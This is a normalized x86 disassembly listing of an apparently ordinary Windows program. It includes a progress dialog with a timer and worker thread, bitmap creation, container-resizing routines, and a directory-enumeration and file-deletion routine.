retn
dec [ esi + 0x4 ]
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x1c
retn
dec [ esi + 0x4 ]
jne r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
sub_406690
push 0xffffffff
push sub_4beab8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push 0x2
mov [ esp + 0x14 ] 0x0
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov esi [ esp + 0x18 ]
test esi esi
push ecx
mov [ esp + 0x8 ] esp
mov eax esp
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
mov [ esp + 0x10 ] 0xffffffff
je r-xdata
mov [ eax ] esi
call [ rw-data ]
test eax eax
mov [ esp + 0x10 ] 0xffffffff
jl r-xdata
inc [ esi + 0x4 ]
mov ecx [ esp + 0x8 ]
xor eax eax
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x10
retn
dec [ ecx + 0x4 ]
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov eax [ ecx ]
jmp r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x10
retn
dec [ esi + 0x4 ]
jne r-xdata
push 0x1
call [ eax ]
mov eax [ esi ]
mov ecx esi
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
sub_406750
push 0xffffffff
push sub_4beab8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3c
push esi
push edi
xor edi edi
push 0x2
mov [ esp + 0x50 ] edi
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x60 ]
mov edx [ esp + 0x64 ]
mov eax [ esp + 0x68 ]
mov esi [ esp + 0x54 ]
cmp esi edi
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x70 ]
mov [ esp + 0x1c ] edx
mov edx [ esp + 0x74 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x6c ]
mov [ esp + 0xc ] ecx
lea ecx [ esp + 0x2c ]
push ecx
mov ecx [ esp + 0x60 ]
mov [ esp + 0x14 ] edx
lea edx [ esp + 0x10 ]
push edx
mov edx [ esp + 0x60 ]
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x20 ]
push eax
push ecx
push edx
push ecx
mov [ esp + 0x3c ] edi
mov [ esp + 0x40 ] edi
mov [ esp + 0x2c ] edi
mov [ esp + 0x20 ] esp
mov eax esp
je r-xdata
mov ecx [ esp + 0x54 ]
cmp ecx edi
mov [ esp + 0x4c ] 0xffffffff
je r-xdata
mov [ eax ] esi
call [ rw-data ]
cmp eax edi
mov [ esp + 0x4c ] 0xffffffff
jne r-xdata
inc [ esi + 0x4 ]
mov ecx [ esp + 0x44 ]
pop edi
xor eax eax
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x48
retn
dec [ ecx + 0x4 ]
jne r-xdata
cmp esi edi
je r-xdata
cmp esi edi
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
xor eax eax
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0x48
retn
dec [ esi + 0x4 ]
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0x48
retn
dec [ esi + 0x4 ]
jne r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
sub_406880
push ebp
mov ebp esp
push 0xffffffff
push sub_4bead8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x2
call sub_404aa0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push 0x1
push ebx
push eax
push ebx
push ecx
mov [ ebp - 0x4 ] ebx
push edx
mov [ ebp - 0x4 ] 0x1
call sub_41c070
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
cmp esi ebx
mov eax [ ebp + 0x14 ]
push eax
push ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x18 ] esp
mov eax esp
je r-xdata
inc [ esi + 0x4 ]
mov [ eax ] esi
call [ rw-data ]
cmp esi ebx
mov edi eax
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
inc [ esi + 0x4 ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec [ esi + 0x4 ]
jne r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
sub_406950
push ebp
mov ebp esp
push 0xffffffff
push sub_4beaf8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x2
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push 0x1
xor ebx ebx
push ebx
push eax
push ebx
push ecx
push edx
mov [ ebp - 0x4 ] ebx
call sub_41c070
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
cmp esi ebx
mov edi [ ebp + 0x1c ]
mov eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
lea edx [ ebp - 0x40 ]
push edx
push edi
push ecx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x14 ] esp
mov eax esp
je r-xdata
inc [ esi + 0x4 ]
mov [ eax ] esi
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
inc [ esi + 0x4 ]
mov al [ ebp + 0x30 ]
test al al
jne r-xdata
mov eax [ ebp + 0x24 ]
mov ecx [ ebp - 0x40 ]
mov edx [ ebp + 0x28 ]
mov [ eax ] ecx
mov eax [ ebp - 0x3c ]
mov ecx [ ebp + 0x2c ]
mov [ edx ] eax
mov eax [ ebp - 0x34 ]
test eax eax
mov edx [ ebp - 0x38 ]
mov [ ecx ] edx
je r-xdata
test esi esi
mov [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
push ecx
mov [ ebp - 0x14 ] esp
mov eax esp
je r-xdata
movzx ecx [ edi + 0xe ]
mov eax [ edi + 0x4 ]
imul eax ecx
add eax 0x7
cdq
and edx 0x7
add eax edx
mov ebx eax
sar ebx 0x3
add ebx 0xf
and ebx 0xfffffff0
cmp ecx 0x2
mov [ ebp - 0x14 ] ecx
jne r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax ebx
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
dec [ esi + 0x4 ]
jne r-xdata
mov [ eax ] esi
call [ rw-data ]
inc [ esi + 0x4 ]
mov eax [ ebp + 0x20 ]
push 0x0
push 0x0
push eax
push 0x0
push edi
push 0x0
call [ CreateDIBSection@IAT ]
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp [ ebp - 0x14 ] 0x2
jne r-xdata
mov [ edi + 0x4 ] ebx
mov [ edi + 0xe ] 0x8
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebx * 8 ]
cdq
sub eax edx
sar eax 0x1
mov [ edi + 0x4 ] eax
mov [ edi + 0xe ] 0x2
mov edx [ esi ]
push 0x0
push 0x0
push 0x0
mov ecx esi
call [ edx + 0x20 ]
mov ecx [ ebp + 0x20 ]
mov edx [ ecx ]
lea eax [ ebp - 0x2c ]
push eax
push edx
push edi
push ecx
mov ecx [ esi + 0x4 ]
inc ecx
mov eax esp
mov [ esi + 0x4 ] ecx
mov [ ebp - 0x14 ] esp
mov [ eax ] esi
call [ rw-data ]
mov ebx eax
mov ebx 0xffffff00
jmp r-xdata
sub_406b40
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
xor esi esi
jmp r-xdata
mov ecx [ edi + 0x8 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x14 ] edx
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push 0x1
push ecx
mov eax esp
mov ecx edi
mov [ eax ] ebx
call sub_403bf0
imul esi esi 0x1c
add esi [ edi + 0x4 ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov ecx ebx
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
mov esi edx
sub_406bb0
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_4039b0
mov eax esi
imul eax eax 0x70
add esp 0x14
add eax edi
pop edi
pop esi
retn 0xc
sub_406be0
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
xor esi esi
jmp r-xdata
mov ecx [ edi + 0x8 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x14 ] edx
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push 0x1
push ecx
mov eax esp
mov ecx edi
mov [ eax ] ebx
call sub_403f60
imul esi esi 0x38
add esi [ edi + 0x4 ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov ecx ebx
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov esi edx
sub_406c50
push ebp
mov ebp esp
push 0xffffffff
push sub_4beb1b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x7c
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push eax
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x14 ] esi
call sub_402400
mov eax [ esi + 0x4 ]
xor edi edi
cmp eax edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov ecx [ esi + 0xc ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov edi edx
mov eax [ ebp - 0x1c ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x70 ] esi
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0x84 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx esi
call sub_402c70
mov ecx 0x2492492
sub ecx edx
cmp ecx ebx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov edx ecx
sub edx edi
mov [ ebp + 0x10 ] edx
mov eax 0x92492493
imul edx
add edx [ ebp + 0x10 ]
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
cmp edx ebx
mov [ ebp - 0x18 ] ecx
jae r-xdata
mov eax edi
shr eax 0x1
mov ecx 0x2492492
sub ecx eax
cmp ecx edi
jae r-xdata
add edx ebx
cmp edi edx
jae r-xdata
push ecx
imul ebx ebx 0x70
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
sub ecx ebx
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] ecx
mov [ eax ] ecx
mov ecx esi
call sub_4042e0
mov edx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
push ecx
mov ecx [ ebp - 0x18 ]
mov eax esp
mov [ ebp + 0xc ] esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ ebp + 0xc ] esp
push ecx
mov [ eax ] edx
mov eax esp
mov [ eax ] edi
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push eax
call sub_403600
add esp 0x10
lea ecx [ ebp - 0x88 ]
push ecx
push ecx
mov eax esp
add ebx edi
mov [ eax ] ebx
mov eax ebx
imul eax eax 0x70
mov [ ebp + 0x10 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_4042e0
mov ecx [ esi + 0x8 ]
sub ecx edi
lea edx [ ebp - 0x88 ]
push edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esi + 0x8 ]
sub ebx edx
push ebx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_406bb0
mov edx [ esi + 0x8 ]
mov ecx [ ebp + 0x10 ]
add edx ecx
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0x88 ]
push edx
push ecx
mov eax esp
sub esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ eax ] esi
jmp r-xdata
add edi eax
xor edi edi
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0x8 ] esp
call sub_402db0
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
imul edi edi 0x70
push edi
call sub_4b573e
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov [ ebp + 0xc ] eax
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ ebp - 0x4 ] 0x1
mov [ eax ] ecx
call sub_4037c0
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push esi
lea edx [ ebp - 0x88 ]
push edx
push ebx
push eax
mov [ ebp + 0xc ] eax
call sub_4039b0
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax ebx
imul eax eax 0x70
add esp 0x14
add ecx eax
mov eax [ esi + 0x8 ]
push edx
push esi
push ecx
push ecx
mov [ ebp + 0xc ] ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_4037c0
mov eax [ esi + 0x4 ]
add esp 0x14
test eax eax
jne r-xdata
mov ecx esi
call sub_4010f0
mov edi eax
add edi ebx
add edx ebx
cmp edi edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
imul ebx ebx 0x70
add edi eax
add ebx eax
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
push ecx
push eax
mov ecx esi
call sub_403920
mov edx [ esi + 0x4 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
add ebx edx
test eax eax
je r-xdata
sub_406ff0
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x88 ] 0x10
push edi
jb r-xdata
lea eax [ esi + 0x74 ]
mov eax [ esi + 0x74 ]
jmp r-xdata
push esi
push sub_401070
push eax
push 0x0
push esi
call sub_4053a0
add esp 0x14
push esi
mov edi eax
mov eax [ esi + 0x8c ]
push edi
push 0x1401
push eax
call [ PostMessageA@IAT ]
mov eax edi
pop edi
pop esi
retn 0x4
sub_407040
mov eax [ esp + 0x8 ]
sub esp 0x20
cmp eax 0x111
push ebx
push esi
push edi
ja r-xdata
cmp eax 0x113
je r-xdata
je r-xdata
mov edi [ esp + 0x30 ]
push 0xffffffeb
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
mov eax [ esi + 0x98 ]
cdq
push edx
mov edx [ esi + 0x24 ]
push eax
mov eax [ esi + 0x20 ]
push edx
push eax
call sub_4b6490
push 0x0
push 0x64
push edx
push eax
call sub_4b6420
push 0x0
push 0x0
push 0xdc9
push edi
mov ebx eax
call [ GetDlgItemInt@IAT ]
cmp eax ebx
je r-xdata
cmp eax 0x1401
je r-xdata
movzx eax [ esp + 0x38 ]
sub eax 0x2
jne r-xdata
sub eax 0x2
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
push 0x0
push ebx
push 0xdc9
push edi
call [ SetDlgItemInt@IAT ]
mov ecx [ esi + 0x98 ]
push 0x0
push ecx
push 0x402
push 0xdcb
push edi
call [ SendDlgItemMessageA@IAT ]
mov edi [ esp + 0x30 ]
push 0xffffffeb
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
mov edx [ esi + 0x94 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
mov eax [ esi + 0x94 ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x38 ]
push ecx
push edi
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x20
retn 0x10
mov edi [ esp + 0x30 ]
push 0xffffffeb
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
mov eax [ esi + 0x94 ]
push 0xffffffff
push eax
mov [ esi + 0x90 ] 0x1
call [ WaitForSingleObject@IAT ]
mov ecx [ esi + 0x94 ]
push ecx
call [ CloseHandle@IAT ]
push 0x1
push edi
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
mov edx [ esp + 0x30 ]
push 0x1
push edx
call [ KillTimer@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
sub eax 0x10e
jne r-xdata
mov esi [ esp + 0x3c ]
mov edi [ esp + 0x30 ]
push esi
push 0xffffffeb
push edi
call [ SetWindowLongA@IAT ]
lea eax [ esp + 0x1c ]
push eax
push edi
call [ GetParent@IAT ]
mov ebx [ GetWindowRect@IAT ]
push eax
call ebx
lea ecx [ esp + 0xc ]
push ecx
push edi
call ebx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x28 ]
sub eax ecx
mov ecx [ esp + 0x20 ]
sub eax ecx
add eax edx
cdq
sub eax edx
mov edx [ esp + 0x24 ]
sar eax 0x1
add eax ecx
mov ecx [ esp + 0x14 ]
push 0x5
push 0x0
push 0x0
push eax
mov eax [ esp + 0x1c ]
sub eax ecx
mov ecx [ esp + 0x2c ]
sub eax ecx
add eax edx
cdq
sub eax edx
sar eax 0x1
add eax ecx
push eax
push 0x0
push edi
call [ SetWindowPos@IAT ]
cmp [ esi + 0x18 ] 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x74 ]
mov eax [ esi + 0x74 ]
jmp r-xdata
mov ebx [ SetDlgItemTextA@IAT ]
push eax
push 0xdc7
push edi
call ebx
cmp [ esi + 0x88 ] 0x10
jb r-xdata
push 0xfffffff7
push edi
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x20
retn 0x10
push eax
push 0xdc8
push edi
call ebx
mov edx [ esi + 0x20 ]
mov eax [ esi + 0x24 ]
mov ebx [ SetDlgItemInt@IAT ]
shrd edx eax 0xa
push 0x0
push edx
push 0xdca
push edi
shr eax 0xa
call ebx
push 0x0
push 0x0
push 0xdc9
push edi
call ebx
push 0xdcb
push edi
call [ GetDlgItem@IAT ]
push 0x640000
push 0x0
push 0x401
push eax
call [ SendMessageA@IAT ]
push 0x0
push 0xc8
push 0x1
push edi
call [ SetTimer@IAT ]
lea ecx [ esp + 0x30 ]
push ecx
push 0x0
push esi
push sub_406ff0
push 0x0
push 0x0
mov [ esi + 0x90 ] 0x0
mov [ esi + 0x8c ] edi
mov [ esi + 0x98 ] 0x0
call sub_4b638f
add esp 0x18
test eax eax
mov [ esi + 0x94 ] eax
jne r-xdata
sub_407320
push 0xffffffff
push sub_4beb43
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xa0
push ebx
push ebp
push esi
xor ebx ebx
mov ebp 0xf
mov [ esp + 0xb4 ] ebx
mov [ esp + 0x24 ] ebp
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] bl
mov [ esp + 0x78 ] ebp
mov [ esp + 0x74 ] ebx
mov [ esp + 0x64 ] bl
mov [ esp + 0x94 ] ebp
mov [ esp + 0x90 ] ebx
mov [ esp + 0x80 ] bl
lea eax [ esp + 0xbc ]
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0xb8 ] 0x1
call sub_402540
mov edx [ esp + 0x12c ]
mov eax edx
lea esi [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ esp + 0x84 ]
call sub_401e80
mov eax [ rw-data ]
lea ecx [ esp + 0xc ]
push ecx
push sub_407040
push eax
push 0xc1f
push 0xfffffffa
push eax
mov [ esp + 0xb0 ] ebx
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
lea ecx [ esp + 0xc ]
mov esi eax
call sub_401b30
cmp [ esp + 0x128 ] 0x10
jb r-xdata
cmp [ esp + 0xd4 ] 0x10
mov [ esp + 0x128 ] ebp
mov [ esp + 0x124 ] ebx
mov [ esp + 0x114 ] bl
jb r-xdata
mov edx [ esp + 0x114 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0xac ]
mov eax esi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xac
retn
mov eax [ esp + 0xc0 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_407460
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov ebx edx
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esi + 0x8 ]
push ecx
push ecx
mov eax esp
mov [ eax ] edx
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_406b40
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0xc ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp ebx edx
jae r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ esi + 0x8 ]
push edx
push esi
push eax
push 0x1
push edi
call sub_403640
add esp 0x14
add edi 0x1c
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
retn 0x4
sub_4074f0
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov ebx edx
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esi + 0x8 ]
push ecx
push ecx
mov eax esp
mov [ eax ] edx
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_406be0
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0xc ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp ebx edx
jae r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ esi + 0x8 ]
push edx
push esi
push eax
push 0x1
push edi
call sub_4036e0
add esp 0x14
add edi 0x38
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
retn 0x4
sub_407580
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
xor esi esi
jmp r-xdata
mov ecx [ edi + 0x8 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x14 ] edx
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push 0x1
push ecx
mov eax esp
mov ecx edi
mov [ eax ] ebx
call sub_406c50
imul esi esi 0x70
add esi [ edi + 0x4 ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov ecx ebx
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov esi edx
sub_4075f0
push 0xffffffff
push sub_4beb79
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18c
push ebx
push ebp
push esi
push edi
mov eax [ esp + 0x1c4 ]
xor ebp ebp
mov ebx 0x10
cmp eax ebx
mov eax [ esp + 0x1b0 ]
mov [ esp + 0x1a4 ] ebp
jae r-xdata
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0x1b0 ]
push r--data
lea eax [ esp + 0x1b0 ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
call sub_402140
add esp 0xc
cmp [ esp + 0x28 ] ebx
mov eax [ esp + 0x14 ]
mov [ esp + 0x1a4 ] 0x1
jae r-xdata
push 0x5c
push 0x1
lea ecx [ esp + 0x1b4 ]
call sub_4017f0
lea edx [ esp + 0x5c ]
push edx
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ esp + 0x14 ]
mov [ esp + 0x34 ] ebp
mov [ esp + 0x38 ] ebp
mov [ esp + 0x3c ] ebp
mov esi [ lstrcmpA@IAT ]
mov [ esp + 0x1a4 ] 0x2
jmp r-xdata
cmp [ esp + 0x28 ] ebx
jb r-xdata
push r--data
lea edx [ esp + 0x8c ]
push edx
call esi
test eax eax
je r-xdata
cmp [ esp + 0x1c4 ] ebx
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] ebp
mov [ esp + 0x14 ] 0x0
jb r-xdata
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
lea edx [ esp + 0x5c ]
push edx
push edi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x8c ]
push eax
call esi
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x1b0 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
push edi
call [ FindClose@IAT ]
mov ebx [ DeleteFileA@IAT ]
xor esi esi
lea edi [ ebp + 0x4 ]
lea ebx [ ebx ]
test [ esp + 0x5c ] 0x10
je r-xdata
mov ecx [ esp + 0x19c ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x198
retn
mov eax [ esp + 0x1c4 ]
mov esi 0x10
cmp eax esi
mov eax [ esp + 0x1b0 ]
jae r-xdata
mov ecx [ esp + 0x38 ]
sub ecx ebp
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
cmp esi edx
jae r-xdata
lea ecx [ esp + 0x88 ]
push ecx
